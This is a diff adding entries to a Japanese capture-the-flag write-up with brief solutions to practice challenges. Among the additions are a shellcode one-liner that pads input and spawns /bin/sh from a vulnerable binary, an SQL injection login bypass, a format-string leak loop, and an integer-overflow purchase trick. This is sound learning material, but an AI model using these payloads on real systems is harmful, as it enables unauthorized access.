@@ -60,25 +60,31 @@ echo -e "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 - ソースを見ると、HTMLにJavascriptが埋め込まれてる  
 - どうやら、JSでパスワードチェックしている  
 - JSで比較している文字列を並び変えるだけ  
+
 ## logon
 - cookieのadminをTrueにする  
 - chromeだと、「EditThisCookie」という拡張機能が便利
+
 ## strings it
 - バイナリファイルなので、stringsコマンド使う(windowsはわからない)
 ```
 strings file_name | grep CTF
 ```
+
 ## vault-door-1
 - Javaコードの中にパスワードを比較している部分がある  
 - 32文字  
 - 単純に並び変える？  
+
 ## what's a net cat?
 - netcat使うだけ　　
 ```
 nc address ip
 ```
+
 ## where are the robots
 - robots.txtにアクセスして、そこの指示に従うだけ　　
+
 
 # 150 points
 ## So Meta
@@ -86,29 +92,36 @@ nc address ip
 ```
 cat file_name | grep CTF
 ```
+
 ## What Lies Within
 - 「青い空を～」のステガノグラフィー解析を使った  
 - 各色の最下位委ビットを選択して抽出する
+
 ## shark on wire 1
 - ワイヤーシャークなどのパケット解析ツールを使用した  
 - UDPストリームを愚直に調べる  
+
 
 # 200 points
 ## Based
 - 「CyberChef」で数字入れてautobakeすると、いい感じにでコードしてくれる  
 - 2, 8, 10, 16進数を文字に変換するタスク  
 - utf-8？shift-jis？  
+
 ## Tapping
 - ncでアクセスすると、モールス信号が表示される
 - モールス信号の返還サイトで変換
+
 ## asm1
 - アセンブリ言語を頑張って読む  
 - 答えの形式は、"CognitiveCTF{0xaaa}"のような感じ  
+
 ## plumbing
 - ncしたのをパイプしてgrep
 ```
 nc host_name port | grep CTF
 ```
+
 ## rsa_pop_quiz
 - 結構時間かかった。RSAの仕組みと計算方法を理解しておくと速く解けそう  
 - 問題文に表示されているnetcatを実行し、問題に答える  
@@ -126,6 +139,15 @@ print(pt)s
 ```
 - 表示された平文をHEXに変換し、asciiに変換する作業は、「CyberChef」がおすすめ  
 
+## slippery_shellcode
+- 「handy-shellcode」とほぼ同じコードだが、rand()を使っている
+- rand()はseed値が固定という脆弱性があるそうなので、変数offsetのとる値をLinux環境で調べる(windowsではgid_tでerror)
+- offsetは常に104とわかるので、shellcodeの前に適当な104文字をくっつけて入力するだけ
+```
+(python -c "print 'a'*104 + '\x68\xcd\x80\x68\x68\xeb\xfc\x68\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xeb\xe1'";cat) | ./vuln
+```
+- shellが起動するので、flag.txtをcatする
+
 ## whats-the-difference
 - 結構悩んだ  
 - cmpコマンドとgawkで差分のバイトをASCII変換  
@@ -141,19 +163,34 @@ python cat_kit.py
 - flagをよく見ると、ある程度単語があって、たまに数字になってる  
 - "_bu77r_"をbufferと解釈し、"_bu773r_"とすると通った  
 - 原因は不明...  
+
 ## where-is-the-file
 ```
 ls -a
 cat secret_file
 ```
 
+
 # 250 points
+## asm2
+- 引数が2つの時のアセンブリ言語の挙動を追っていく
+- どうやら以下のプログラムに変換できそうなので、やってみる
+```
+a1 = 0xf
+a2 = 0x21
+while a1 < 0xcdf1:
+    a2 += 0x1
+    a1 += 0xe3
+print(hex(a2))
+```
+
 ## c0rrupt
 - fileを渡されるが、「青空白猫」のバイナリエディタで解析してみるとpngファイルっぽい
 - ヒントにheaderを直す旨が書かれていたので、pngのフォーマットを調べて修正をかける
 - linuxでは、「pngcheck」というtoolがあるため、使うとCRCの部分を計算して提案してくれたりする
 - やったこととしては、PNG、IHDR、IDATのシグネチャとIDATのlengthを修正
 - IDATのlength(サイズは4byte)は、先頭2byteを0にするだけだった
+
 ## like1000
 - .tarファイルを解凍するshellスクリプトを書く  
 - 例えば以下のコードを'hoge.sh'として保存し、実行する  
@@ -171,4 +208,36 @@ done
 ```
 ```
 bash hoge.sh
+```
+
+
+# 300 points
+## Irish-Name-Repo 1
+- SQLインジェクションの代表的な奴をうちこむ
+- ユーザ名の入力フォームに以下を打つ
+```
+' or 1 = 1 --
+```
+
+## flag_shop
+- プログラムを見ると、フラグを購入する数が代入される変数はintで定義されている
+- intはだいたい4byteで、取りうる値の範囲がわかるので負の値になるように入力する
+- 自分の所持金が増えるはずなので、1337flagを購入する
+
+## mus1c
+- rockstarと呼ばれる歌詞みたいなプログラミング言語らしい。以下のサイトで翻訳できる。
+- https://codewithrockstar.com/online
+- ASCIIコードが出力されるので、文字列に変換するだけ
+
+## stringzz
+- format string攻撃
+- どうやら、標準入力の変数をprintf()やputs()などの関数の引数に渡すとよくないらしい
+- メモリの中身を見れるらしいので、以下のshell codeを書いて、flagを探す
+```
+#! /bin/bash
+
+for ((i=0;i<100;i++))
+do
+echo -e "%$i\$s" | ./vuln | grep CTF
+done
 ```
